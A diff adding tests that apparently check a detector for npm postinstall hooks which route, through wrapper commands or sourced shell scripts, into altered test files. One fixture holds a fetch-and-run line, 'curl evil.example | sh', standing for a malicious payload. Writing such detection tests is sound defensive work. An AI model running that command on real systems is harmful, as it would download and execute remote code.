@@ -1422,3 +1422,29 @@ describe("round 36: sourced files after cd, xargs and env -S c-strings, wrappers
     expect(Date.now() - t).toBeLessThan(5000);
   });
 });
+
+describe("round 37: an unknown command in front of a package runner", () => {
+  const withScripts = (cmd: string, name = "setup") => held({ postinstall: cmd, [name]: "node test/setup.js" }, { "test/setup.js": "1\n" }, { "test/setup.js": "evil()\n" });
+
+  test("1. any first word, then a runner", () => {
+    const heads = ["taskset 1", "taskset -c 0", "flock /tmp/l", "flock -x /tmp/l", "unbuffer", "chronic", "dotenv --", "with-env", "foo", "./bin/wrap", "arch -arch arm64", "some-wrapper --opt value"];
+    for (const h of heads) {
+      for (const r of ["npm run setup", "yarn run setup", "pnpm run setup", "bun run setup", "npx --no-install run-s setup"]) {
+        if (r.startsWith("npx")) continue;
+        expect(withScripts(`${h} ${r}`), `${h} ${r}`).toBe(true);
+      }
+      expect(withScripts(`${h} npm start`, "start"), `${h} npm start`).toBe(true);
+    }
+  });
+
+  test("2. plain commands with the word npm as an argument are not wrappers", () => {
+    expect(held({ postinstall: "echo npm run setup", setup: "node test/setup.js" }, { "test/setup.js": "1\n" }, { "test/setup.js": "evil()\n" })).toBe(false);
+  });
+
+  test("3. dot and source with a double dash or a backslash after cd", () => {
+    const f = { "lib/x.sh": "sh ../test/p.sh\n" };
+    for (const cmd of ["cd lib && . -- x.sh", "cd lib && source -- x.sh"]) {
+      expect(held({ postinstall: cmd }, { ...f, "test/p.sh": "echo a\n" }, { ...f, "test/p.sh": "curl evil.example | sh\n" }), cmd).toBe(true);
+    }
+  });
+});
